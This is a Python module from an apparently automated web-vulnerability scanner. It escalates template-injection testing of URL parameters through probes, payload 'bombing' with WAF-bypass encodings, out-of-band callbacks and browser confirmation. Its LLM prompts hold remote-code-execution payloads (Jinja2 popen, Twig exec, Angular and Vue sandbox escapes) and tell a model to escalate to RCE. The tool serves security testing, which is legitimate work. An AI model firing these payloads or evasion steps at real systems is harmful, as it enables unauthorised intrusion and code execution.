"""
CSTI Pipeline

ORCHESTRATION: 6-Level Escalation Pipeline (L0-L6) and main exploit flow.
Contains the escalation logic, smart probes, and validation pipeline.

Most functions here are I/O (they make HTTP requests, call Playwright, etc.)
but they are composed from pure validation/engine functions.
"""

import asyncio
import json
from typing import Dict, List, Optional, Tuple
from pathlib import Path
from urllib.parse import urlparse, parse_qs

from bugtrace.agents.csti.types import CSTIFinding
from bugtrace.agents.csti.engines import (
    fingerprint_engines,
    detect_engine_from_payload,
    classify_engine_type,
    is_client_side_engine,
)
from bugtrace.agents.csti.payloads import (
    PAYLOAD_LIBRARY,
    build_l2_payload_list,
    get_universal_bypass_payloads,
    should_stop_testing,
)
from bugtrace.agents.csti.validation import (
    check_csti_confirmed,
    check_arithmetic_evaluation,
    check_string_multiplication,
    check_config_reflection,
    check_engine_signatures,
    check_error_signatures,
    is_client_side_payload,
)
from bugtrace.agents.csti.exploitation import (
    inject_param,
    create_finding,
    send_csti_payload_raw,
    get_encoded_payloads,
    fetch_page,
    get_baseline_content,
)
from bugtrace.agents.csti.dedup import (
    generate_csti_fingerprint,
    fallback_fingerprint_dedup,
    normalize_csti_finding_params,
)
from bugtrace.core.http_manager import http_manager, ConnectionProfile
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings
from bugtrace.utils.logger import get_logger
from bugtrace.utils.parsers import XmlParser

logger = get_logger("agents.csti.pipeline")


# =========================================================================
# VALIDATION PIPELINE (4-Level)
# =========================================================================

async def validate_csti(
    url: str,
    param: str,
    payload: str,
    response_html: str,
    screenshots_dir: Path,
    agent_name: str,
    interactsh_client=None,
    check_oob_hit_fn=None,
) -> Tuple[bool, Dict]:  # I/O
    """
    4-LEVEL VALIDATION PIPELINE (V2.0) - CSTI/SSTI Alignment.

    L1: HTTP Static Reflection Check (Arithmetic/Signatures)
    L2: AI-Powered Manipulator (Logic Evasion)
    L3: Playwright Browser Execution (Client-side engines)
    L4: Return False for AgenticValidator escalation

    v3.2 FIX: For JS-rendered sites (empty response_html), skip L1/L2 and go
    directly to L3 Playwright for client-side payloads (Angular, Vue).

    Args:
        url: Target URL
        param: Parameter name
        payload: The CSTI payload
        response_html: HTTP response body
        screenshots_dir: Directory for screenshots
        agent_name: Agent name for logging
        interactsh_client: Optional Interactsh client for OOB checks
        check_oob_hit_fn: Optional async callable for OOB hit checking

    Returns:
        Tuple of (validated: bool, evidence: dict)
    """
    evidence = {"payload": payload}

    # Detect JS-rendered site and client-side payload
    response_len = len(response_html.strip())
    is_js_rendered = response_len < 500
    is_csp = is_client_side_payload(payload)

    logger.info(
        f"[{agent_name}] CSTI validate: response_len={response_len}, "
        f"is_js_rendered={is_js_rendered}, is_client_side={is_csp}"
    )

    if is_js_rendered and is_csp:
        logger.info(f"[{agent_name}] JS-rendered site + client-side payload - skipping L1/L2, going to L3 Playwright")
        if await _validate_with_playwright(url, param, payload, screenshots_dir, evidence, agent_name):
            return True, evidence
        logger.debug(f"[{agent_name}] L3 Playwright failed for JS-rendered CSTI, escalating to L4")
        return False, evidence

    # Standard flow for server-side or non-JS sites
    # Level 1: HTTP Static Reflection Check
    logger.info(f"[{agent_name}] L1 checking: {payload[:40]}...")
    try:
        l1_result = await _validate_http_reflection(
            url, param, payload, response_html, evidence, agent_name,
            check_oob_hit_fn=check_oob_hit_fn,
        )
        if l1_result:
            logger.info(f"[{agent_name}] L1 CONFIRMED: {evidence.get('method')}")
            return True, evidence
    except Exception as e:
        logger.warning(f"[{agent_name}] L1 exception: {e}")
    logger.info(f"[{agent_name}] L1 failed, trying L2")

    # Level 2: AI-Powered Manipulator (placeholder)
    try:
        if response_html and payload in response_html:
            # Payload reflected but not evaluated - L2 placeholder
            pass
    except Exception as e:
        logger.warning(f"[{agent_name}] L2 exception: {e}")
    logger.info(f"[{agent_name}] L2 failed, trying L3 Playwright")

    # Level 3: Playwright Browser Execution
    try:
        l3_result = await _validate_with_playwright(
            url, param, payload, screenshots_dir, evidence, agent_name
        )
        if l3_result:
            return True, evidence
    except Exception as e:
        logger.warning(f"[{agent_name}] L3 exception: {e}")

    # Level 4: Return False for AgenticValidator
    logger.info(f"[{agent_name}] L1-L3 all failed for {payload[:40]}")
    return False, evidence


async def _validate_http_reflection(
    url: str,
    param: str,
    payload: str,
    response_html: str,
    evidence: Dict,
    agent_name: str,
    check_oob_hit_fn=None,
) -> bool:  # I/O
    """Level 1: Fast HTTP static evaluation check."""
    # Tier 1.1: OOB Interactsh
    if check_oob_hit_fn:
        if await check_oob_hit_fn(f"csti_{param}"):
            evidence["method"] = "L1: OOB Interactsh"
            evidence["level"] = 1
            return True

    if not response_html:
        return False

    # Tier 1.2: Signatures and Arithmetic
    async with http_manager.isolated_session(ConnectionProfile.PROBE) as session:
        baseline = await get_baseline_content(session, url)
        if check_arithmetic_evaluation(response_html, payload, baseline):
            evidence["method"] = "L1: Arithmetic Evaluation"
            evidence["level"] = 1
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True

    if check_string_multiplication(response_html, payload):
        evidence["method"] = "L1: String Multiplication"
        evidence["level"] = 1
        evidence["status"] = "VALIDATED_CONFIRMED"
        return True

    if check_config_reflection(response_html, payload):
        evidence["method"] = "L1: Config Reflection"
        evidence["level"] = 1
        evidence["status"] = "VALIDATED_CONFIRMED"
        return True

    if check_engine_signatures(response_html, payload):
        evidence["method"] = "L1: Engine Signature"
        evidence["level"] = 1
        evidence["status"] = "VALIDATED_CONFIRMED"
        return True

    if check_error_signatures(response_html):
        evidence["method"] = "L1: Error Signature"
        evidence["level"] = 1
        evidence["status"] = "VALIDATED_CONFIRMED"
        return True

    return False


async def _validate_with_playwright(
    url: str,
    param: str,
    payload: str,
    screenshots_dir: Path,
    evidence: Dict,
    agent_name: str,
) -> bool:  # I/O
    """Level 3: Playwright browser execution (Client-side engines like Angular)."""
    attack_url = inject_param(url, param, payload)

    logger.info(f"[{agent_name}] L3 Playwright validating CSTI: {payload[:50]}...")

    from bugtrace.agents.agentic_validator import _verifier_pool
    verifier = await _verifier_pool.get_verifier()
    try:
        result = await verifier.verify_xss(
            url=attack_url,
            screenshot_dir=str(screenshots_dir),
            timeout=15.0,
            max_level=3,
        )

        logger.info(f"[{agent_name}] L3 Playwright result: success={result.success}, details={result.details}")

        if result.success:
            evidence.update(result.details or {})
            evidence["playwright_confirmed"] = True
            evidence["screenshot_path"] = result.screenshot_path
            evidence["method"] = "L3: Playwright Browser"
            evidence["level"] = 3
            evidence["status"] = "VALIDATED_CONFIRMED"
            return True
    finally:
        _verifier_pool.release()

    return False


async def test_payload_with_validation(
    session,
    url: str,
    param: str,
    payload: str,
    agent_name: str,
) -> Tuple[Optional[str], Optional[str]]:  # I/O
    """
    Inject payload and perform 4-level validation.
    Returns (content, effective_url) if validated (L1-L3).
    Returns (None, None) if validation fails.

    Args:
        session: aiohttp session
        url: Target URL
        param: Parameter name
        payload: The payload
        agent_name: Agent name for logging

    Returns:
        Tuple of (content, final_url) or (None, None)
    """
    target_url = inject_param(url, param, payload)

    try:
        async with session.get(target_url, timeout=5) as resp:
            content = await resp.text()
            final_url = str(resp.url)

            logger.debug(f"[{agent_name}] CSTI test: response {len(content)} chars for {payload[:30]}")

            validated, evidence = await validate_csti(
                url, param, payload, content, Path(settings.LOG_DIR), agent_name
            )
            if validated:
                logger.info(
                    f"[{agent_name}] CSTI VALIDATED: {payload[:50]} via {evidence.get('method', 'unknown')}"
                )
                return content, final_url

            logger.debug(f"[{agent_name}] CSTI L1-L3 failed for {payload[:30]}")
    except Exception as e:
        logger.debug(f"[{agent_name}] CSTI test error: {e}")

    return None, None


# =========================================================================
# ESCALATION LEVEL IMPLEMENTATIONS (L0-L6)
# =========================================================================

async def escalation_smart_probe(
    url: str,
    param: str,
    engines: List[str],
    baseline_html: str,
    agent_name: str,
    verbose_emitter=None,
    tech_profile: Dict = None,
    tech_stack_context: Dict = None,
) -> Tuple[Optional[CSTIFinding], bool]:  # I/O
    """
    Smart probe: 1 request to check if template syntax reflects or evaluates.

    Args:
        url: Target URL
        param: Parameter to test
        engines: Detected engines
        baseline_html: Baseline HTML for false positive check
        agent_name: Agent name for logging
        verbose_emitter: Optional verbose event emitter
        tech_profile: Optional tech profile
        tech_stack_context: Optional tech stack context

    Returns:
        Tuple of (CSTIFinding or None, should_continue: bool)
        - If finding returned: confirmed CSTI
        - should_continue=False: no reflection, skip this param entirely
        - should_continue=True: reflects, continue normal escalation
    """
    probe = "BT_CSTI_49{{7*7}}${7*7}"
    async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
        response, verified_url = await send_csti_payload_raw(session, url, param, probe)
        if response is None:
            return None, True  # Network error, continue anyway

        # Check if probe marker reflects at all
        if "BT_CSTI_49" not in response:
            if any(e in ["angular", "vue"] for e in engines):
                dashboard.log(
                    f"[{agent_name}] Smart probe: no HTTP reflection for '{param}' "
                    f"but client-side engine detected, continuing to browser testing",
                    "INFO",
                )
                return None, True
            dashboard.log(
                f"[{agent_name}] Smart probe: no reflection for '{param}', skipping",
                "INFO",
            )
            return None, False

        # Check if template evaluation happened
        if "49" in response and "7*7" not in response and "49" not in baseline_html:
            if verbose_emitter:
                verbose_emitter.emit(
                    "exploit.specialist.signature_match",
                    {"agent": "CSTI", "param": param, "payload": probe[:100], "method": "smart_probe"},
                )
            dashboard.log(
                f"[{agent_name}] Smart probe: CONFIRMED CSTI on '{param}' ({{{{7*7}}}}=49)",
                "INFO",
            )
            engine = "unknown"
            if any(e in ["angular", "vue"] for e in engines):
                engine = engines[0]
            finding = create_finding(
                url, param, "{{7*7}}", "smart_probe", agent_name,
                verified_url=verified_url, tech_profile=tech_profile,
                tech_stack_context=tech_stack_context,
            )
            finding.evidence = {
                "method": "arithmetic_eval",
                "proof": "{{7*7}} evaluated to 49",
                "status": "VALIDATED_CONFIRMED",
                "level": "smart_probe",
                "engine": engine,
            }
            return finding, True

        dashboard.log(
            f"[{agent_name}] Smart probe: '{param}' reflects, continuing escalation",
            "INFO",
        )
        return None, True


async def escalation_l0_wet_payload(
    url: str,
    param: str,
    wet_payload: str,
    engines: List[str],
    baseline_html: str,
    agent_name: str,
    tech_profile: Dict = None,
    tech_stack_context: Dict = None,
) -> Optional[CSTIFinding]:  # I/O
    """L0: Test the WET finding's payload first (from DASTySAST/Skeptic)."""
    dashboard.set_current_payload(wet_payload[:60], "CSTI L0", "WET payload", agent_name)

    async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
        response, verified_url = await send_csti_payload_raw(session, url, param, wet_payload)
        if response is not None:
            confirmed, evidence = check_csti_confirmed(wet_payload, response, baseline_html)
            if confirmed:
                evidence["level"] = "L0"
                finding = create_finding(
                    url, param, wet_payload, "L0_wet_payload", agent_name,
                    verified_url=verified_url, tech_profile=tech_profile,
                    tech_stack_context=tech_stack_context,
                )
                finding.evidence = evidence
                return finding

        # Try double-quote variant if single-quote payload failed
        if "'" in wet_payload:
            dq_payload = wet_payload.replace("'", '"')
            dashboard.set_current_payload(dq_payload[:60], "CSTI L0", "WET DQ variant", agent_name)
            response, verified_url = await send_csti_payload_raw(session, url, param, dq_payload)
            if response is not None:
                confirmed, evidence = check_csti_confirmed(dq_payload, response, baseline_html)
                if confirmed:
                    evidence["level"] = "L0"
                    finding = create_finding(
                        url, param, dq_payload, "L0_wet_dq_variant", agent_name,
                        verified_url=verified_url, tech_profile=tech_profile,
                        tech_stack_context=tech_stack_context,
                    )
                    finding.evidence = evidence
                    return finding

    logger.info(f"[{agent_name}] L0: WET payload not confirmed for '{param}'")
    return None


async def escalation_l1_template_probe(
    url: str,
    param: str,
    baseline_html: str,
    agent_name: str,
    interactsh_client=None,
    tech_profile: Dict = None,
    tech_stack_context: Dict = None,
) -> Optional[CSTIFinding]:  # I/O
    """L1: Send polyglot template probes, check HTTP arithmetic evaluation."""
    probes = [
        "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{7*'7'}}",
    ]

    confirmed_payloads = []
    first_finding = None

    async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
        for probe in probes:
            dashboard.set_current_payload(probe, "CSTI L1", "Polyglot", agent_name)
            response, verified_url = await send_csti_payload_raw(session, url, param, probe)
            if response is None:
                continue

            confirmed, evidence = check_csti_confirmed(probe, response, baseline_html)
            if confirmed:
                confirmed_payloads.append(probe)
                if not first_finding:
                    evidence["level"] = "L1"
                    first_finding = create_finding(
                        url, param, probe, "L1_template_probe", agent_name,
                        verified_url=verified_url, tech_profile=tech_profile,
                        tech_stack_context=tech_stack_context,
                    )
                    first_finding.evidence = evidence
                if len(confirmed_payloads) >= 5:
                    break

    # Check Interactsh OOB
    if not first_finding and interactsh_client:
        try:
            interactions = await interactsh_client.poll()
            if interactions:
                first_finding = create_finding(
                    url, param, probes[0], "L1_interactsh_oob", agent_name,
                    tech_profile=tech_profile, tech_stack_context=tech_stack_context,
                )
                first_finding.evidence = {"method": "L1_interactsh_oob", "oob": True, "level": "L1"}
                confirmed_payloads.append(probes[0])
        except Exception:
            pass

    if first_finding:
        first_finding.successful_payloads = confirmed_payloads
        logger.info(f"[{agent_name}] L1: {len(confirmed_payloads)} confirmed for '{param}'")
        return first_finding

    logger.info(f"[{agent_name}] L1: No CSTI confirmed for '{param}'")
    return None


async def escalation_l2_static_bombing(
    url: str,
    param: str,
    engines: List[str],
    baseline_html: str,
    agent_name: str,
    interactsh_url: str = "",
    detected_waf: str = None,
    interactsh_client=None,
    verbose_emitter=None,
    tech_profile: Dict = None,
    tech_stack_context: Dict = None,
) -> Tuple[Optional[CSTIFinding], List[str]]:  # I/O
    """
    L2: Fire all engine-specific + universal payloads via HTTP.

    Returns:
        Tuple of (finding or None, list of reflecting payloads for L5)
    """
    all_payloads = build_l2_payload_list(engines, interactsh_url)

    # Apply WAF bypass encodings
    all_payloads = await get_encoded_payloads(all_payloads, detected_waf)

    logger.info(f"[{agent_name}] L2: Bombing {len(all_payloads)} static payloads on '{param}'")

    confirmed_payloads = []
    first_finding = None
    reflecting = []

    async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
        for i, payload in enumerate(all_payloads):
            if verbose_emitter:
                verbose_emitter.progress(
                    "exploit.specialist.progress",
                    {"agent": "CSTI", "param": param, "payload": payload[:80], "i": i, "total": len(all_payloads)},
                    every=50,
                )
            if i % 20 == 0 and i > 0:
                dashboard.log(f"[{agent_name}] L2: Progress {i}/{len(all_payloads)}", "DEBUG")
            dashboard.set_current_payload(payload[:60], "CSTI L2", f"{i+1}/{len(all_payloads)}", agent_name)

            response, verified_url = await send_csti_payload_raw(session, url, param, payload)
            if response is None:
                continue

            confirmed, evidence = check_csti_confirmed(payload, response, baseline_html)
            if confirmed:
                if verbose_emitter:
                    verbose_emitter.emit(
                        "exploit.specialist.signature_match",
                        {"agent": "CSTI", "param": param, "payload": payload[:100], "method": "L2_static_bombing"},
                    )
                confirmed_payloads.append(payload)
                if not first_finding:
                    evidence["level"] = "L2"
                    first_finding = create_finding(
                        url, param, payload, "L2_static_bombing", agent_name,
                        verified_url=verified_url, tech_profile=tech_profile,
                        tech_stack_context=tech_stack_context,
                    )
                    first_finding.evidence = evidence
                if len(confirmed_payloads) >= 5:
                    break
                continue

            # Track payloads where template syntax reflects (for L5 browser)
            if payload in response or ("49" in response and "49" not in baseline_html):
                reflecting.append(payload)

    # Batch OOB check
    if not first_finding and interactsh_client:
        try:
            interactions = await interactsh_client.poll()
            if interactions:
                best = all_payloads[0] if all_payloads else "{{7*7}}"
                first_finding = create_finding(
                    url, param, best, "L2_interactsh_oob", agent_name,
                    tech_profile=tech_profile, tech_stack_context=tech_stack_context,
                )
                first_finding.evidence = {"method": "L2_interactsh_oob", "oob": True, "level": "L2"}
                confirmed_payloads.append(best)
        except Exception:
            pass

    if first_finding:
        first_finding.successful_payloads = confirmed_payloads
        logger.info(f"[{agent_name}] L2: {len(confirmed_payloads)} confirmed, {len(reflecting)} reflecting for '{param}'")
        return first_finding, reflecting

    logger.info(f"[{agent_name}] L2: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
    return None, reflecting


async def escalation_l3_llm_bombing(
    url: str,
    param: str,
    engines: List[str],
    existing_reflecting: List[str],
    baseline_html: str,
    agent_name: str,
    system_prompt: str = "",
    csti_prime_directive: str = "",
    interactsh_url: str = "",
    detected_waf: str = None,
    tech_profile: Dict = None,
    tech_stack_context: Dict = None,
) -> Tuple[Optional[CSTIFinding], List[str]]:  # I/O
    """
    L3: Generate LLM CSTI payloads x WAF encodings, fire via HTTP.

    Returns:
        Tuple of (finding or None, list of reflecting payloads)
    """
    from bugtrace.core.llm_client import llm_client

    engine_hint = engines[0] if engines else "unknown"

    user_prompt = (
        f"Target URL: {url}\nParameter: {param}\nDetected engine: {engine_hint}\n"
        f"Tech context: {csti_prime_directive}\n\n"
        f"Generate 50 advanced CSTI/SSTI payloads for template injection testing. "
        f"Include variations for: Angular, Vue, Jinja2, Twig, Freemarker, Mako, ERB, Velocity. "
        f"Focus on arithmetic evaluation (7*7=49), config access, sandbox bypasses, and RCE. "
        f"Include double-quote variants for servers that reject single quotes. "
        f"Return each payload in <payload> tags."
    )

    try:
        response = await llm_client.generate(
            user_prompt, system_prompt=system_prompt, module_name="CSTI_L3"
        )
        llm_payloads = XmlParser.extract_list(response, "payload")
    except Exception as e:
        logger.error(f"[{agent_name}] L3: LLM generation failed: {e}")
        llm_payloads = []

    if not llm_payloads:
        logger.info(f"[{agent_name}] L3: LLM generated 0 payloads, skipping")
        return None, []

    # Apply WAF encodings
    llm_payloads = await get_encoded_payloads(llm_payloads, detected_waf)

    # Replace Interactsh placeholders
    if interactsh_url:
        llm_payloads = [p.replace("{{INTERACTSH}}", interactsh_url) for p in llm_payloads]

    logger.info(f"[{agent_name}] L3: Bombing {len(llm_payloads)} LLM payloads on '{param}'")

    confirmed_payloads = []
    first_finding = None
    reflecting = []

    async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
        for i, payload in enumerate(llm_payloads):
            if i % 20 == 0 and i > 0:
                dashboard.log(f"[{agent_name}] L3: Progress {i}/{len(llm_payloads)}", "DEBUG")
            dashboard.set_current_payload(payload[:60], "CSTI L3", f"{i+1}/{len(llm_payloads)}", agent_name)

            response, verified_url = await send_csti_payload_raw(session, url, param, payload)
            if response is None:
                continue

            confirmed, evidence = check_csti_confirmed(payload, response, baseline_html)
            if confirmed:
                confirmed_payloads.append(payload)
                if not first_finding:
                    evidence["level"] = "L3"
                    first_finding = create_finding(
                        url, param, payload, "L3_llm_bombing", agent_name,
                        verified_url=verified_url, tech_profile=tech_profile,
                        tech_stack_context=tech_stack_context,
                    )
                    first_finding.evidence = evidence
                if len(confirmed_payloads) >= 5:
                    break
                continue

            if payload in response or ("49" in response and "49" not in baseline_html):
                reflecting.append(payload)

    if first_finding:
        first_finding.successful_payloads = confirmed_payloads
        logger.info(f"[{agent_name}] L3: {len(confirmed_payloads)} confirmed, {len(reflecting)} reflecting for '{param}'")
        return first_finding, reflecting

    logger.info(f"[{agent_name}] L3: {len(reflecting)} reflecting, 0 confirmed for '{param}'")
    return None, reflecting


async def escalation_l4_http_manipulator(
    url: str,
    param: str,
    agent_name: str,
) -> Tuple[Optional[CSTIFinding], List[str]]:  # I/O
    """
    L4: ManipulatorOrchestrator - context detection, WAF bypass for SSTI.

    Returns:
        Tuple of (finding or None, list of reflecting payloads)
    """
    from bugtrace.tools.manipulator.orchestrator import ManipulatorOrchestrator
    from bugtrace.tools.manipulator.models import MutableRequest, MutationStrategy

    reflecting = []
    try:
        parsed = urlparse(url)
        base_params = dict(parse_qs(parsed.query, keep_blank_values=True))
        base_params = {k: v[0] if v else "" for k, v in base_params.items()}
        if param not in base_params:
            base_params[param] = "{{7*7}}"

        base_request = MutableRequest(
            method="GET",
            url=url.split("?")[0],
            params=base_params,
        )

        manipulator = ManipulatorOrchestrator(
            rate_limit=0.3,
            enable_agentic_fallback=True,
            enable_llm_expansion=True,
        )

        success, mutation = await manipulator.process_finding(
            base_request,
            strategies=[MutationStrategy.SSTI_INJECTION, MutationStrategy.BYPASS_WAF],
        )

        if success and mutation:
            working_payload = mutation.params.get(param, str(mutation.params))
            original_value = base_params.get(param, "{{7*7}}")

            # Verify the TARGET param was actually mutated
            if working_payload == original_value:
                logger.info(f"[{agent_name}] L4: ManipulatorOrchestrator exploited different param, not '{param}'")
                await manipulator.shutdown()
                return None, reflecting

            # Verify payload contains CSTI/SSTI indicators
            csti_indicators = [
                "{{", "${", "<%", "#{", "#set", "#if", "#include",
                "7*7", "constructor", "__class__", "config",
                "lipsum", "range(", "dump(", "system(", "exec(",
                "popen(", "Runtime", "Process", "forName",
            ]
            if not any(ind in working_payload for ind in csti_indicators):
                logger.info(f"[{agent_name}] L4: ManipulatorOrchestrator payload rejected (no CSTI syntax): {working_payload[:80]}")
                await manipulator.shutdown()
                return None, reflecting

            # Re-verify template evaluation via HTTP
            verify_url = url.split("?")[0]
            verify_params = dict(base_params)
            verify_params[param] = working_payload
            try:
                async with http_manager.isolated_session(ConnectionProfile.EXTENDED) as session:
                    async with session.get(verify_url, params=verify_params, timeout=15) as resp:
                        verify_body = await resp.text()
                    baseline_params = dict(base_params)
                    baseline_params[param] = "btai_baseline_test"
                    async with session.get(verify_url, params=baseline_params, timeout=15) as resp:
                        baseline_body = await resp.text()
                confirmed, confirm_evidence = check_csti_confirmed(
                    working_payload, verify_body, baseline_body
                )
                if not confirmed:
                    logger.info(
                        f"[{agent_name}] L4: ManipulatorOrchestrator payload REFLECTED but NOT EVALUATED: "
                        f"{working_payload[:80]}"
                    )
                    reflecting.append(working_payload)
                    await manipulator.shutdown()
                    return None, reflecting
            except Exception as verify_err:
                logger.debug(f"[{agent_name}] L4 verification request failed: {verify_err}")

            logger.info(f"[{agent_name}] L4: ManipulatorOrchestrator CONFIRMED: {param}={working_payload[:80]}")
            await manipulator.shutdown()
            finding = create_finding(url, param, working_payload, "L4_manipulator", agent_name, verified_url=url)
            finding.evidence = {"http_confirmed": True, "level": "L4", "method": "L4_manipulator"}
            return finding, reflecting

        # Collect blood smell candidates for L5
        if hasattr(manipulator, "blood_smell_history") and manipulator.blood_smell_history:
            for entry in sorted(
                manipulator.blood_smell_history, key=lambda x: x["smell"]["severity"], reverse=True
            )[:5]:
                blood_payload = entry["request"].params.get(param, "")
                if blood_payload:
                    reflecting.append(blood_payload)
            logger.info(f"[{agent_name}] L4: {len(reflecting)} blood smell candidates for L5")

        await manipulator.shutdown()

    except Exception as e:
        logger.error(f"[{agent_name}] L4: ManipulatorOrchestrator failed: {e}")

    return None, reflecting


async def escalation_l5_browser(
    url: str,
    param: str,
    reflecting_payloads: List[str],
    agent_name: str,
    tech_profile: Dict = None,
    tech_stack_context: Dict = None,
) -> Optional[CSTIFinding]:  # I/O
    """L5: Browser validation (Playwright) for client-side CSTI (Angular/Vue)."""
    seen = set()
    candidates = []
    for p in reflecting_payloads:
        if p not in seen:
            seen.add(p)
            candidates.append(p)

    candidates = candidates[:10]  # Limit to 10 browser tests (expensive)
    logger.info(f"[{agent_name}] L5: Browser testing {len(candidates)} reflecting payloads on '{param}'")

    screenshots_dir = Path(settings.LOG_DIR) / "csti_screenshots"
    screenshots_dir.mkdir(parents=True, exist_ok=True)

    confirmed_payloads = []
    first_finding = None

    for i, payload in enumerate(candidates):
        dashboard.set_current_payload(payload[:60], "CSTI L5 Browser", f"{i+1}/{len(candidates)}", agent_name)
        try:
            evidence = {}
            if await _validate_with_playwright(url, param, payload, screenshots_dir, evidence, agent_name):
                confirmed_payloads.append(payload)
                if not first_finding:
                    logger.info(f"[{agent_name}] L5: Playwright CONFIRMED: {payload[:60]}")
                    first_finding = create_finding(
                        url, param, payload, "L5_browser", agent_name,
                        tech_profile=tech_profile, tech_stack_context=tech_stack_context,
                    )
                    first_finding.evidence = {
                        **evidence, "playwright_confirmed": True,
                        "level": "L5", "method": "L5_browser",
                    }
                if len(confirmed_payloads) >= 5:
                    break
        except Exception as e:
            logger.debug(f"[{agent_name}] L5: Browser test {i+1} failed: {e}")

    if first_finding:
        first_finding.successful_payloads = confirmed_payloads
        logger.info(f"[{agent_name}] L5: {len(confirmed_payloads)}/{len(candidates)} confirmed in browser for '{param}'")
        return first_finding

    logger.info(f"[{agent_name}] L5: 0/{len(candidates)} confirmed in browser for '{param}'")
    return None


def create_l6_cdp_finding(
    url: str,
    param: str,
    reflecting_payloads: List[str],
    agent_name: str,
    tech_profile: Dict = None,
    tech_stack_context: Dict = None,
) -> Optional[CSTIFinding]:  # PURE
    """
    L6: Flag best reflecting payload for CDP AgenticValidator.

    Args:
        url: Target URL
        param: Parameter name
        reflecting_payloads: List of payloads that reflected
        agent_name: Agent name for logging
        tech_profile: Optional tech profile
        tech_stack_context: Optional tech stack context

    Returns:
        CSTIFinding with validated=False, or None
    """
    if not reflecting_payloads:
        return None

    best_payload = reflecting_payloads[0]
    logger.info(f"[{agent_name}] L6: Flagging '{param}' for CDP AgenticValidator (payload: {best_payload[:60]})")

    engine = detect_engine_from_payload(best_payload, tech_profile, tech_stack_context)
    engine_type = classify_engine_type(engine)

    return CSTIFinding(
        url=url,
        parameter=param,
        payload=best_payload,
        template_engine=engine,
        engine_type=engine_type,
        severity="MEDIUM",
        validated=False,
        status="NEEDS_CDP_VALIDATION",
        description=(
            f"Potential {engine} CSTI: template syntax reflects. "
            f"Best payload: {best_payload[:60]}. Flagged for CDP validation."
        ),
        evidence={
            "method": "L6_cdp_flagged",
            "level": "L6",
            "reflecting_count": len(reflecting_payloads),
            "needs_cdp": True,
        },
    )


# =========================================================================
# LLM ANALYSIS
# =========================================================================

def build_template_system_prompt() -> str:  # PURE
    """Get system prompt for template analysis."""
    return """You are an elite Template Injection specialist.
CSTI (Client-Side): Angular, Vue - executes in browser
SSTI (Server-Side): Jinja2, Twig, Freemarker - executes on server (more dangerous)

For each engine, you must know:
- Angular 1.x: {{constructor.constructor('code')()}} - sandbox bypass needed
- Vue 2.x: {{_c.constructor('code')()}}
- Jinja2: {{config}}, {{lipsum.__globals__['os'].popen('cmd').read()}}
- Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}

CRITICAL: Generate payloads that:
1. Prove code execution (not just reflection)
2. Include OOB callback for blind detection
3. Escalate to RCE if SSTI (server-side)"""


def build_template_user_prompt(
    url: str, param: str, detected_engines: List[str],
    interactsh_url: str, html: str,
) -> str:  # PURE
    """Build user prompt for LLM template analysis."""
    return f"""Analyze this page for Template Injection:
URL: {url}
Parameter: {param}
Detected Engines: {detected_engines}
OOB Callback: {interactsh_url}

HTML (truncated):
```html
{html[:6000]}
```

Generate 1-3 PRECISE payloads for the detected engine(s).
For each payload, explain:
1. Target engine
2. What it exploits (sandbox bypass, RCE, etc.)
3. Expected output

Response format (XML):
<payloads>
  <payload>
    <engine>angular|vue|jinja2|twig|etc</engine>
    <code>THE_PAYLOAD</code>
    <exploitation>What it does</exploitation>
    <expected_output>What to look for</expected_output>
  </payload>
</payloads>"""


def parse_llm_payloads(content: str, interactsh_url: str) -> List[Dict]:  # PURE
    """
    Parse LLM response into payload dicts.

    Args:
        content: LLM response text
        interactsh_url: Interactsh URL for placeholder replacement

    Returns:
        List of dicts with 'code' and 'engine' keys
    """
    payloads = XmlParser.extract_list(content, "payload")
    parsed_items = []

    for p_str in payloads:
        code = XmlParser.extract_tag(p_str, "code")
        engine = XmlParser.extract_tag(p_str, "engine")

        if code:
            if "{{INTERACTSH}}" in code and interactsh_url:
                code = code.replace("{{INTERACTSH}}", interactsh_url)

            parsed_items.append({
                "code": code,
                "engine": engine or "unknown",
            })

    return parsed_items


async def llm_smart_template_analysis(
    html: str,
    url: str,
    param: str,
    detected_engines: List[str],
    interactsh_url: str,
) -> List[Dict]:  # I/O
    """
    LLM-First Strategy: Analyze HTML and generate targeted CSTI/SSTI payloads.

    Args:
        html: Page HTML content
        url: Target URL
        param: Parameter name
        detected_engines: List of detected engine names
        interactsh_url: Interactsh URL for OOB

    Returns:
        List of payload dicts with 'code' and 'engine' keys
    """
    from bugtrace.core.llm_client import llm_client

    system_prompt = build_template_system_prompt()
    user_prompt = build_template_user_prompt(url, param, detected_engines, interactsh_url, html)

    try:
        response = await llm_client.generate(
            prompt=user_prompt,
            module_name="CSTI_SMART_ANALYSIS",
            system_prompt=system_prompt,
            model_override=settings.MUTATION_MODEL,
            max_tokens=3000,
            temperature=0.3,
        )
        return parse_llm_payloads(response, interactsh_url)
    except Exception as e:
        logger.error(f"LLM Smart Analysis failed: {e}", exc_info=True)
        return []


async def llm_analyze_and_dedup(
    wet_findings: List[Dict],
    context: str,
    tech_stack_context: Dict = None,
    csti_prime_directive: str = "",
    csti_dedup_context_fn=None,
    detect_engines_fn=None,
) -> List[Dict]:  # I/O
    """
    Use LLM to intelligently deduplicate CSTI findings (v3.2: Context-Aware).
    Falls back to fingerprint-based dedup if LLM fails.

    Args:
        wet_findings: List of WET finding dicts
        context: Scan context string
        tech_stack_context: Optional tech stack context
        csti_prime_directive: Optional CSTI prime directive prompt
        csti_dedup_context_fn: Optional callable(tech_stack) -> str
        detect_engines_fn: Optional callable(frameworks, tech_tags, lang) -> List[str]

    Returns:
        Deduplicated list of findings
    """
    from bugtrace.core.llm_client import llm_client

    tech_stack = tech_stack_context or {}
    lang = tech_stack.get("lang", "generic")
    frameworks = tech_stack.get("frameworks", [])
    waf = tech_stack.get("waf")

    csti_dedup_context = csti_dedup_context_fn(tech_stack) if csti_dedup_context_fn and tech_stack else ""

    raw_profile = tech_stack.get("raw_profile", {})
    tech_tags = [t.lower() for t in raw_profile.get("tech_tags", [])]
